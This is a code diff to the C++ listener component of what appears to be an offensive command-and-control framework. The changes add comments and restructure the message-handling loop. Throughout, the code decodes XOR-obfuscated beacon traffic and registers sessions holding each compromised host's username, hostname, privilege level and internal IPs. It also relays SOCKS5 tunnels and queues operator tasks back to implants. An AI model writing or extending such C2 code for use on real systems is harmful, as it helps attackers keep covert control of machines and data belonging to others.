@@ -150,19 +150,28 @@ bool Listener::updateSessionPoofOfLife(std::string& beaconHash, std::string& las
 }
 
 
+// Adds a listener to an existing session based on the beacon's hash.
+// Returns true if the session was found and the listener was added, false otherwise.
 bool Listener::addSessionListener(const std::string& beaconHash, const std::string& listenerHash, const std::string& type, const std::string& param1, const std::string& param2)
 {
+	// Ensure thread-safe access to the sessions list.
 	std::lock_guard<std::mutex> lock(m_mutex);
 
 	bool sessionExist = false;
+
+	// Iterate through all active sessions to find the one matching the given beacon hash.
 	for(auto it = m_sessions.begin() ; it != m_sessions.end(); ++it )
 	{
 		if (beaconHash == (*it)->getBeaconHash())
 		{
 			sessionExist=true;
+
+			// Add the listener to the matching session if it doesn't already exist.
 			(*it)->addListener(listenerHash, type, param1, param2);
 		}
 	}
+
+	// Return true if the session was found and updated, false otherwise.
 	return sessionExist;
 }
 
@@ -287,11 +296,6 @@ C2Message Listener::getTaskResult(const std::string& beaconHash)
 }
 
 
-//
-// SocksSession
-// TODO could we do a Templat ?
-//
-
 bool Listener::isSocksSessionExist(std::string& beaconHash, std::string& listenerHash)
 {
 	std::lock_guard<std::mutex> lock(m_mutex);
@@ -350,11 +354,13 @@ bool Listener::handleMessages(const std::string& input, std::string& output)
 	std::string data = base64_decode(input);
 	XOR(data, m_key);
 
-	// Mutli Session, Multi message 
+	// Mutli Sessions, Multi messages
 	MultiBundleC2Message multiBundleC2Message;
 	multiBundleC2Message.ParseFromArray(data.data(), (int)data.size());
 
-	// Handle messages comming from beacons
+	//
+	// 1) Handle messages comming from beacons
+	//
 	// Create taksResult to be display by the TeamServer
 	for (int k = 0; k < multiBundleC2Message.bundlec2messages_size(); k++) 
 	{
@@ -369,114 +375,87 @@ bool Listener::handleMessages(const std::string& input, std::string& output)
 			listenerhash = getListenerHash();
 		bundleC2Message->set_listenerhash(listenerhash);
 
-		// TODO env information shouln't be mandatory and should be check
-		// we shoul be able to set information like hostname/username and such upon requesting
-		if(beaconHash.size()==SizeBeaconHash)
+		if(beaconHash.size()!=SizeBeaconHash)
+			continue;
+
+		bool isExist = isSessionExist(beaconHash, listenerhash);
+
+		// If the session does not exist, create a new one
+		if(isExist==false)
 		{
-			bool isExist = isSessionExist(beaconHash, listenerhash);
-			if(isExist==false)
+			// TODO if no info are provided, queu a getInfo cmd
+			SPDLOG_DEBUG("beaconHash {0}, listenerhash {0}", beaconHash, listenerhash);
+
+			std::string username = bundleC2Message->username();
+			std::string hostname = bundleC2Message->hostname();
+			std::string arch = bundleC2Message->arch();
+			std::string privilege = bundleC2Message->privilege();
+			std::string os = bundleC2Message->os();
+			std::string internalIps = bundleC2Message->internalIps();
+			std::string processId = bundleC2Message->processId();
+			std::string additionalInformation = bundleC2Message->additionalInformation();
+
+			std::shared_ptr<Session> session = make_shared<Session>(listenerhash, beaconHash, hostname, username, arch, privilege, os);
+			session->setInternalIps(internalIps);
+			session->setProcessId(processId);
+			session->setAdditionalInformation(additionalInformation);
+			m_sessions.push_back(std::move(session));
+		}
+		// If the session already exist, update the information
+		else
+		{
+			std::string lastProofOfLife = bundleC2Message->lastProofOfLife();
+			updateSessionPoofOfLife(beaconHash, lastProofOfLife);
+		}
+
+		// For each message in this session
+		for (int j = 0; j < bundleC2Message->c2messages_size(); j++) 
+		{
+			const C2Message& c2Message = bundleC2Message->c2messages(j);
+
+			addTaskResult(c2Message, beaconHash);
+
+			// Handle instruction that have impact on this Listener
+			// Here if a beacon is terminated, we need to remove the list of sessions associeted with it.
+			if(c2Message.instruction()==EndCmd)
 			{
-				// TODO if no info are provided, queu a getInfo cmd
-				SPDLOG_DEBUG("beaconHash {0}, listenerhash {0}", beaconHash, listenerhash);
-
-				std::string username = bundleC2Message->username();
-				std::string hostname = bundleC2Message->hostname();
-				std::string arch = bundleC2Message->arch();
-				std::string privilege = bundleC2Message->privilege();
-				std::string os = bundleC2Message->os();
-				std::string internalIps = bundleC2Message->internalIps();
-				std::string processId = bundleC2Message->processId();
-				std::string additionalInformation = bundleC2Message->additionalInformation();
-
-				std::shared_ptr<Session> session = make_shared<Session>(listenerhash, beaconHash, hostname, username, arch, privilege, os);
-				session->setInternalIps(internalIps);
-				session->setProcessId(processId);
-				session->setAdditionalInformation(additionalInformation);
-				m_sessions.push_back(std::move(session));
-			}
-			else
-			{
-				std::string lastProofOfLife = bundleC2Message->lastProofOfLife();
-				updateSessionPoofOfLife(beaconHash, lastProofOfLife);
-			}
-
-			// For each message in this session
-			for (int j = 0; j < bundleC2Message->c2messages_size(); j++) 
-			{
-				const C2Message& c2Message = bundleC2Message->c2messages(j);
-
-				// TODO what happen to thos taskResult for listeners that are managed by beacons
-				// if(!c2Message.returnvalue().empty() || c2Message.errorCode()>0)
-				// {
-				addTaskResult(c2Message, beaconHash);
-				// }
-
-				// Handle instruction that have impact on this Listener
-
-				// Here if a beacon is terminated, we need to remove the list of sessions associeted with it.
-				if(c2Message.instruction()==EndCmd)
+				markSessionKilled(beaconHash);
+				
+				int nbSession = getNumberOfSession();
+				for(int kk=0; kk<nbSession; kk++)
 				{
-					markSessionKilled(beaconHash);
-					
-					int nbSession = getNumberOfSession();
-					for(int kk=0; kk<nbSession; kk++)
+					std::shared_ptr<Session> sessions = getSessionPtr(kk);
+					std::vector<SessionListener> sessionListenerList;
+					sessionListenerList.insert(sessionListenerList.end(), sessions->getListener().begin(), sessions->getListener().end());
+					for (int j = 0; j < sessionListenerList.size(); j++)
 					{
-						std::shared_ptr<Session> sessions = getSessionPtr(kk);
-						std::vector<SessionListener> sessionListenerList;
-						sessionListenerList.insert(sessionListenerList.end(), sessions->getListener().begin(), sessions->getListener().end());
-						for (int j = 0; j < sessionListenerList.size(); j++)
-						{
-							rmSessionListener(beaconHash, sessionListenerList[j].getListenerHash());
-						}
-					}
-				}	
-				// TODO socks5 handle with socks sessions link to this listener - to test
-				// check if the listener is primary (meaning launched by the teamserver, otherwise don't do this) and just relay the task to the next listener
-				else if(c2Message.instruction()==Socks5Cmd && m_isPrimary)
-				{
-					bool isExist = isSocksSessionExist(beaconHash, listenerhash);
-					if(isExist==false)
-					{
-						std::shared_ptr<SocksSession> session = make_shared<SocksSession>(listenerhash, beaconHash);
-						m_socksSessions.push_back(std::move(session));
-					}
-
-					addSocksTaskResult(c2Message, beaconHash);
-				}
-				else if(c2Message.instruction()==ListenerCmd)
-				{
-					std::string cmd = c2Message.cmd();
-					std::vector<std::string> splitedCmd;
-					std::string delimiter = " ";
-					splitList(cmd, delimiter, splitedCmd);
-
-					if(splitedCmd[0]==StartCmd)
-					{
-						std::string listenerMetadata = c2Message.data();
-						std::string listenerHash = c2Message.returnvalue();
-
-						nlohmann::json parsed;
-						try
-						{
-							parsed = nlohmann::json::parse(listenerMetadata);
-							std::string type = parsed["1"];
-							std::string param1 = parsed["2"];
-							std::string param2 = parsed["3"];
-
-							addSessionListener(beaconHash, listenerHash, type, param1, param2);
-						} 
-						catch (...)
-						{
-							continue;
-						}
-					}
-					else if(splitedCmd[0]==StopCmd)
-					{
-						rmSessionListener(beaconHash, c2Message.returnvalue());
+						rmSessionListener(beaconHash, sessionListenerList[j].getListenerHash());
 					}
 				}
-				else if(c2Message.instruction()==ListenerPollCmd)
-				{					
+			}	
+			// Handle socks5 messages
+			// Check if the listener is primary - meaning launched by the teamserver. Otherwise don't do this and just relay the task to the next listener
+			else if(c2Message.instruction()==Socks5Cmd && m_isPrimary)
+			{
+				bool isExist = isSocksSessionExist(beaconHash, listenerhash);
+				if(isExist==false)
+				{
+					std::shared_ptr<SocksSession> session = make_shared<SocksSession>(listenerhash, beaconHash);
+					m_socksSessions.push_back(std::move(session));
+				}
+
+				addSocksTaskResult(c2Message, beaconHash);
+			}
+			// Handle return instruction sent to beacon to start/stop listeners
+			else if(c2Message.instruction()==ListenerCmd)
+			{
+				std::string cmd = c2Message.cmd();
+				std::vector<std::string> splitedCmd;
+				std::string delimiter = " ";
+				splitList(cmd, delimiter, splitedCmd);
+
+				if(splitedCmd[0]==StartCmd)
+				{
 					std::string listenerMetadata = c2Message.data();
 					std::string listenerHash = c2Message.returnvalue();
 
@@ -495,11 +474,39 @@ bool Listener::handleMessages(const std::string& input, std::string& output)
 						continue;
 					}
 				}
+				else if(splitedCmd[0]==StopCmd)
+				{
+					rmSessionListener(beaconHash, c2Message.returnvalue());
+				}
+			}
+			// Handle proof of life of listeners
+			else if(c2Message.instruction()==ListenerPollCmd)
+			{					
+				std::string listenerMetadata = c2Message.data();
+				std::string listenerHash = c2Message.returnvalue();
+
+				nlohmann::json parsed;
+				try
+				{
+					parsed = nlohmann::json::parse(listenerMetadata);
+					std::string type = parsed["1"];
+					std::string param1 = parsed["2"];
+					std::string param2 = parsed["3"];
+
+					addSessionListener(beaconHash, listenerHash, type, param1, param2);
+				} 
+				catch (...)
+				{
+					continue;
+				}
 			}
 		}
+		
 	}
 
-	// Handle commands to send to Beacons
+	//
+	// 2) Handle commands to send to Beacons
+	//
 	// For every beacons contacting the listener, check if their are tasks to be sent and create a message to send it
 	bool isTaskToSend=false;
 	MultiBundleC2Message multiBundleC2MessageRet;
@@ -510,28 +517,26 @@ bool Listener::handleMessages(const std::string& input, std::string& output)
 		// Sessions are unique and created from the pair beaconHash / listenerHash
 		// If listenerHash is already filled it means that the session was already handled by other listener befor this one
 		std::string beaconHash = bundleC2Message->beaconhash();
-		if(beaconHash.size()==SizeBeaconHash)
+		if(beaconHash.size()!=SizeBeaconHash)
+			continue;
+		
+		// Look for tasks in the queue for the this beacon
+		C2Message c2Message = getTask(beaconHash);
+		if(!c2Message.instruction().empty())
 		{
-			// Look for tasks in the queu for the this beacon
-			C2Message c2Message = getTask(beaconHash);
-			if(!c2Message.instruction().empty())
+			isTaskToSend=true;
+			BundleC2Message *bundleC2Message = multiBundleC2MessageRet.add_bundlec2messages();
+			bundleC2Message->set_beaconhash(beaconHash);
+
+
+			while(!c2Message.instruction().empty())
 			{
-				isTaskToSend=true;
-				BundleC2Message *bundleC2Message = multiBundleC2MessageRet.add_bundlec2messages();
-				bundleC2Message->set_beaconhash(beaconHash);
-
-				// Not neaded
-				// std::string listenerhash = getListenerHash();
-				// bundleC2Message->set_listenerhash(listenerhash);
-
-				while(!c2Message.instruction().empty())
-				{
-					C2Message *addedC2MessageRet = bundleC2Message->add_c2messages();
-					addedC2MessageRet->CopyFrom(c2Message);
-					c2Message = getTask(beaconHash);	
-				}	
-			}
+				C2Message *addedC2MessageRet = bundleC2Message->add_c2messages();
+				addedC2MessageRet->CopyFrom(c2Message);
+				c2Message = getTask(beaconHash);	
+			}	
 		}
+		
 	}
 
 	data="";
